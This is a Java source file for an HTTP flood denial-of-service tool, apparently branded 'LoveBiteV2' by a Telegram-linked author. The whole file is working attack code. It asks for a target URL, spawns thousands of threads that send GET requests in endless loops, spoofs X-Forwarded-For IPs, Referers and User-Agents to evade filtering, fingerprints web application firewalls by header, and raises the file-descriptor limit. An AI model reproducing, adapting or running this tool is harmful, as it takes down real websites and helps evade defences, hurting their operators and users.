import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLException;
import javax.net.ssl.SSLHandshakeException;
import javax.net.ssl.SSLKeyException;
import javax.net.ssl.SSLPeerUnverifiedException;
import javax.net.ssl.SSLProtocolException;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.cert.CertPathValidatorException;
import java.security.cert.X509Certificate;
import java.security.NoSuchAlgorithmException;
import java.security.KeyManagementException;


/*
 * Set a Thread limit. to get better performance you have to know how to handle threads. 
 * run os command to unlock ulimit. 
 * 
 */


public class Dos implements Runnable {
    private static final String ORANGE = "\033[0;33m";
    private static final String BLUE = "\033[0;34m";
    private static final String CYAN = "\033[0;36m";
    private static final String PINK = "\033[0;35m";
    private static final String DARK_GREEN = "\033[0;32m";
    private static final String WHITE = "\033[0;37m";
    private static final String RED = "\033[0;31m"; // Error
    private static final String GREEN = "\033[0;32m"; // Success
    private static final String YELLOW = "\033[0;33m"; // Warning
    private static final String RESET = "\033[0m"; // Reset color



    private static final String[] FIREWALLS = {
        "Cloudflare WAF", "AWS WAF", "Azure Web Application Firewall", "Google Cloud Armor",
        "Sucuri Website Firewall", "Imperva Incapsula", "F5 BIG-IP ASM", "ModSecurity",
        "Barracuda Web Application Firewall", "Fortinet FortiWeb", "Qualys Web Application Firewall",
        "SonicWall WAF", "Radware AppWall", "Citrix Web App Firewall"
    };
    
    private static int amount = 0;
    private static String url = "";
    private static int successfulRequests = 0;
    private static int failedRequests = 0;

    private int seq;
    private int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }


    // ======== Ulimit Unlocked ====================
    public static void setUlimit() {
        ProcessBuilder processBuilder = new ProcessBuilder();
        // Set the command to increase the file descriptor limit
        processBuilder.command("bash", "-c", "ulimit -n 99999");

        try {
            // Start the process and wait for it to complete
            Process process = processBuilder.start();
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                System.out.println(CYAN + "Ulimit successfully set to 99999." + RESET);
            } else {
                System.out.println("Failed to set ulimit. Exit code: " + exitCode);
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
    
    // Get User-Agent from files and handle headers 
    public static String getRandomUserAgentFromFile() {
        String defaultFileName = "useragent.txt";   // don't keep user agent into the same folder
        File file = new File(defaultFileName);
        
        // Default User-Agent
        String defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
        
        if (!file.exists()) {
            // Return the default User-Agent if file is not present
            return defaultUserAgent;
        }
        
        try {
            List<String> userAgents = Files.readAllLines(Paths.get(defaultFileName));
            Random random = new Random();
            return userAgents.get(random.nextInt(userAgents.size()));
        } catch (IOException e) {
            // In case of IO error while reading file, return the default User-Agent
            System.out.println(RED + "Error reading User-Agent file: " + e.getMessage() + RESET);
            return defaultUserAgent;
        }
    }

    // Generate Referer to manipulate website 
    public static String generateReferer() {
        Random random = new Random();
        int length = 8 + random.nextInt(8); // Random length between 6 and 14
        String domain = generateRandomString(length);
        String[] extensions = {".com", ".org", ".net", ".info", ".biz", ".us", ".co", ".uk", ".ca", ".de", ".jp", ".au", ".fr", ".it", ".nl", ".ru", ".ch", ".in", ".br", ".mx", ".kr", ".se", ".es", ".cn", ".tv", ".me", ".int", ".edu", ".gov", ".mil", ".name", ".pro", ".aero", ".museum", ".coop", ".jobs", ".tel", ".asia", ".cat", ".post", ".mobi", ".bz", ".ws", ".eu", ".cc", ".co.uk", ".us.com", ".uk.com", ".org.uk", ".net.uk", ".gov.uk", ".ltd.uk", ".pl", ".be", ".at", ".li", ".hu", ".sk", ".cz", ".ro", ".bg", ".gr", ".pt", ".tr", ".ae", ".sa", ".il", ".qa", ".om", ".kw", ".pk", ".bd", ".np", ".lk", ".sg", ".my", ".ph", ".id", ".vn", ".th", ".tw", ".hk", ".mo", ".pw", ".fm", ".am", ".ai", ".cv", ".dj", ".dm", ".gs", ".gy", ".ht", ".lc", ".mf", ".nu", ".re", ".sc", ".sr", ".st", ".su", ".tg", ".tk", ".tm", ".to", ".vg", ".vu", ".za", ".nom", ".space", ".fun", ".online", ".site", ".store", ".tech", ".app", ".design", ".club", ".blog", ".agency", ".company", ".inc", ".shop", ".travel", ".zone", ".rocks", ".love", ".guru", ".photo", ".pics", ".today", ".win", ".top", ".life", ".email"};
        
        String extension = extensions[random.nextInt(extensions.length)];
        return "https://www." + domain + extension;
    }

    // Generate random string to post in the website 
    private static String generateRandomString(int length) {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder sb = new StringBuilder(length);
        Random random = new Random();
        for (int i = 0; i < length; i++) {
            sb.append(characters.charAt(random.nextInt(characters.length())));
        }
        return sb.toString();
    }


    // Gen Headers and manage them 
    public static Map<String, String> generateHeaders() {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", getRandomUserAgentFromFile());
        headers.put("X-Forwarded-For", generateRandomIP());
        headers.put("Referer", generateReferer());
        return headers;
    }


    // Generate Random IP
    private static String generateRandomIP() {
        Random random = new Random();
        return random.nextInt(256) + "." +
               random.nextInt(256) + "." +
               random.nextInt(256) + "." +
               random.nextInt(256);
    }


    /*
     * Whole process of arg
     */

    private static void printHelp() {
        System.out.println(PINK + "Usage: java Dos [options]" + RESET);
        System.out.println(PINK + "Options:" + RESET);
        System.out.println(PINK + "  -h, --help      Print this help message" + RESET);
        System.out.println(PINK + "  -u, --use       Print usage instructions" + RESET);
    }

    private static void printUsage() {
        System.out.println(DARK_GREEN + "................... How to use this code .........................." + RESET);
        System.out.println(DARK_GREEN + "  kiss me (url) => Paste url here\n  How Much U Love Me🤔 => Set Threads" + RESET);
        System.out.println(DARK_GREEN + "  Set Thread: Choose the number of threads (default: 9999)." + RESET);
        System.out.println(DARK_GREEN + "     Minimum: 999, Maximum: 15999." + RESET);
    }

    // This is the main section of the whole code; 
    public static void main(String[] args) throws Exception {
        Dos dos = new Dos(0, 0);
        for (String arg : args) {
            switch (arg) {
                case "-h":
                case "--help":
                    printHelp();
                    return; // Exit after printing help
                case "-u":
                case "--use":
                    printUsage();
                    return; // Exit after printing usage
                default:
                    System.out.println(RED + "Unknown argument: " + arg + RESET);
                    printUsage();
                    return; // Exit if unknown argument is found
            }
        }
    
        try (Scanner in = new Scanner(System.in)) {
            // Display Banner
            displayBanner();
    
            // User Input for URL
            System.out.print(ORANGE + "Kiss Me 🫣=> " + RESET);
            url = in.nextLine();
            if (!isValidURL(url)) {
                System.out.println(RED + "Invalid URL. Exiting." + RESET);
                return;
            }
    
            // User Input for Number of Threads
            System.out.print(ORANGE + "How Much U Love Me🤔 =>  " + RESET);
            String amountStr = in.nextLine();
            int defaultThreadLimit = 9999;
            int minThreadLimit = 999;
            int maxThreadLimit = 15999;
            int userThreads = (amountStr == null || amountStr.isEmpty()) ? defaultThreadLimit : Integer.parseInt(amountStr);
            if (userThreads < minThreadLimit) {
                System.out.println(RED + "Thread count too low. Setting to minimum: " + minThreadLimit + RESET);
                userThreads = minThreadLimit;
            } else if (userThreads > maxThreadLimit) {
                System.out.println(RED + "Thread count too high. Setting to maximum: " + maxThreadLimit + RESET);
                userThreads = maxThreadLimit;
            }
            Dos.amount = userThreads;
    
            // Default to GET method
            int ioption = url.startsWith("http://") ? 3 : 4;
            System.out.println(WHITE + "Checking firewall status..." + RESET);
    
            // Call the firewallCheck method directly without storing the result
            boolean isFirewallDetected = firewallCheck(url);
            if (isFirewallDetected) {
                System.out.println(RED + "Firewall detected." + RESET);
            } else{
                System.out.println(GREEN + "No firewall detected." + RESET);
            }

            // Check Connection
            System.out.println(ORANGE + "Checking connection to Site..." + RESET);
            if (url.startsWith("http://")) {
                dos.checkConnection(url);
            } else {
                dos.sslCheckConnection(url);
            }
    
            Thread.sleep(1500);
            System.out.println(CYAN + "Starting Attack..." + RESET);
    
            ExecutorService executor = Executors.newFixedThreadPool(Dos.amount);
            for (int i = 0; i < Dos.amount; i++) {
                executor.execute(new Dos(i, ioption));
            }
            executor.shutdown();
            while (!executor.isTerminated()) {
                // Wait for all threads to finish
            }
            System.out.println("Main Thread ended");
    
            // Save Log
            saveLog();
        }
    }
    
    @Override
    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;
                    default:
                        throw new IllegalArgumentException("Invalid attack type: " + this.type);
                }
            }
        } catch (IOException e) {
            System.out.println(RED + "IO Error in thread: " + this.seq + " - " + e.getMessage() + RESET);
        } catch (Exception e) {
            System.out.println(RED + "Error in thread: " + this.seq + " - " + e.getMessage() + RESET);
        }
    }

    private static void displayBanner() {
        String banner = "\n" +
        "╭╮╱╭╮╱╱╱╱╱╱╱╭╮╭━━━╮╱╱╱╱╱╭━┳╮\n" +
        "┃┃╱┃┃╱╱╱╱╱╱╭╯╰┫╭━╮┃╱╱╱╱╱┃╭╯╰╮\n" +
        "┃╰━╯┣━━┳━━┳┻╮╭┫┃╱╰╋━┳━━┳╯╰╮╭╋━━┳━╮\n" +
        "┃╭━╮┃┃━┫╭╮┃╭┫┃┃┃╱╭┫╭┫╭╮┣╮╭┫┃┃┃━┫╭╯\n" +
        "┃┃╱┃┃┃━┫╭╮┃┃┃╰┫╰━╯┃┃┃╭╮┃┃┃┃╰┫┃━┫┃\n" +
        "╰╯╱╰┻━━┻╯╰┻╯╰━┻━━━┻╯╰╯╰╯╰╯╰━┻━━┻╯\n";
        System.out.println(CYAN + banner + RESET);
        System.out.println(ORANGE + "\n            Made By HeartCrafter             " + RESET);
        System.out.println(BLUE + "\n            t.me/heartcrafter            " + RESET);
    }
    
    private static boolean isValidURL(String url) {
        try {
            new URL(url).toURI();
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    private void checkConnection(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = createHttpURLConnection(obj);
        con.setRequestMethod("GET");
        Map<String, String> headers = generateHeaders();
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            con.setRequestProperty(entry.getKey(), entry.getValue());
        }
    
        int responseCode = con.getResponseCode();
        printStatus(responseCode, " Connected to website");
        Dos.url = url;
    }
    
    private void sslCheckConnection(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = createHttpsURLConnection(obj);
        con.setRequestMethod("GET");
        Map<String, String> headers = generateHeaders();
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            con.setRequestProperty(entry.getKey(), entry.getValue());
        }
    
        int responseCode = con.getResponseCode();
        printStatus(responseCode, " Connected to website (SSL)");
        Dos.url = url;
    }
    
    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = createHttpURLConnection(obj);
        con.setRequestMethod("GET");
    
        // Set headers for the request
        Map<String, String> headers = generateHeaders();
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            con.setRequestProperty(entry.getKey(), entry.getValue());
        }
    
        // Send the request and get the response code
        int responseCode = con.getResponseCode();
        if (responseCode >= 200 && responseCode < 300) {
            successfulRequests++;
        } else {
            failedRequests++;
        }
        printStatus(responseCode, " GET attack done! Thread: " + this.seq);
    
        // Clear resources
        con.disconnect();
    }
    
    private static void saveLog() {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter("LoveBiteV2_log.txt", true))) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String timestamp = sdf.format(new Date());
            writer.write("Timestamp: " + timestamp);
            writer.newLine();
            writer.write("URL: " + url);
            writer.newLine();
            writer.write("Total Requests: " + Dos.amount);
            writer.newLine();
            writer.write("Successful Requests: " + successfulRequests);
            writer.newLine();
            writer.write("Failed Requests: " + failedRequests);
            writer.newLine();
            writer.write("=========================================");
            writer.newLine();
            System.out.println(GREEN + "Log saved successfully." + RESET);
        } catch (IOException e) {
            System.out.println(RED + "Failed to save log: " + e.getMessage() + RESET);
        }
    }
    
    private static final Map<String, String> FIREWALL_SIGNATURES = new HashMap<>();
    static {
        FIREWALL_SIGNATURES.put("Cloudflare WAF", "cf-ray");
        FIREWALL_SIGNATURES.put("AWS WAF", "X-Amz-Cf-Id");
        FIREWALL_SIGNATURES.put("Azure Web Application Firewall", "x-ms-waf");
        FIREWALL_SIGNATURES.put("Google Cloud Armor", "X-Cloud-Trace-Context");
        FIREWALL_SIGNATURES.put("Sucuri Website Firewall", "x-sucuri-id");
        FIREWALL_SIGNATURES.put("Imperva Incapsula", "X-CDN-Geo");
        FIREWALL_SIGNATURES.put("F5 BIG-IP ASM", "BigIP");
        FIREWALL_SIGNATURES.put("ModSecurity", "X-Mod-Security");
        FIREWALL_SIGNATURES.put("Barracuda Web Application Firewall", "X-Barracuda-Server");
        FIREWALL_SIGNATURES.put("Fortinet FortiWeb", "X-Fortinet");
        FIREWALL_SIGNATURES.put("Qualys Web Application Firewall", "X-QA");
        FIREWALL_SIGNATURES.put("SonicWall WAF", "X-SonicWall");
        FIREWALL_SIGNATURES.put("Radware AppWall", "X-Radware");
        FIREWALL_SIGNATURES.put("Citrix Web App Firewall", "X-Citrix");
    }

    private static boolean firewallCheck(String url) {
    HttpURLConnection connection = null;
    try {
        URL targetUrl = new URL(url);
        connection = (HttpURLConnection) targetUrl.openConnection();
        connection.setRequestMethod("GET"); // Use HEAD method to just check connectivity
        connection.setConnectTimeout(5000); // Set timeout for connection
        connection.setReadTimeout(5000); // Set timeout for reading

        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_FORBIDDEN) {
            // Check for firewall by looking at the headers
            boolean firewallDetected = false;
            for (String firewallName : FIREWALLS) {
                String signature = FIREWALL_SIGNATURES.get(firewallName);
                if (signature != null && connection.getHeaderField(signature) != null) {
                    System.out.println(GREEN + firewallName + " detected" + RESET);
                    firewallDetected = true;
                }
            }

            if (!firewallDetected) {
                System.out.println(GREEN + "No known firewall detected." + RESET);
            }

            return true; // Firewall detected
        } else {
            return false; // No firewall detected
        }

    } catch (SSLHandshakeException e) {
        System.out.println(RED + "SSL Handshake Error: " + e.getMessage() + RESET);
        System.exit(1); // Terminate the process
    } catch (SSLPeerUnverifiedException e) {
        System.out.println(RED + "SSL Peer Unverified Error: " + e.getMessage() + RESET);
        System.exit(1); // Terminate the process
    } catch (SSLException e) {
        System.out.println(RED + "SSL Exception: " + e.getMessage() + RESET);
        System.exit(1); // Terminate the process
    } catch (IOException e) {
        System.out.println(RED + "IO Error: " + e.getMessage() + RESET);
        return false;
    } finally {
        if (connection != null) {
            connection.disconnect(); // Always disconnect
        }
    }
    return false;
    }


    
    private HttpURLConnection createHttpURLConnection(URL url) throws IOException {
        return (HttpURLConnection) url.openConnection();
    }
    
    private HttpsURLConnection createHttpsURLConnection(URL url) throws IOException {
        return (HttpsURLConnection) url.openConnection();
    }
    
    private void printStatus(int responseCode, String message) {
        if (responseCode >= 200 && responseCode < 300) {
            System.out.println(GREEN + responseCode + " " + message + RESET);
        } else {
            System.out.println(RED + responseCode + " " + message + RESET);
        }
    }
    
    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = createHttpsURLConnection(obj);
        try {
            con.setRequestMethod("GET");
    
            // Set headers for the request
            Map<String, String> headers = generateHeaders();
            for (Map.Entry<String, String> entry : headers.entrySet()) {
                con.setRequestProperty(entry.getKey(), entry.getValue());
            }
    
            // Send the request and get the response code
            int responseCode = con.getResponseCode();
            if (responseCode >= 200 && responseCode < 300) {
                successfulRequests++;
            } else {
                failedRequests++;
            }
            printStatus(responseCode, " SSL GET attack done! Thread: " + this.seq);
    
        } finally {
            // Ensure the connection is disconnected
            con.disconnect();
        }
    }
    }
    
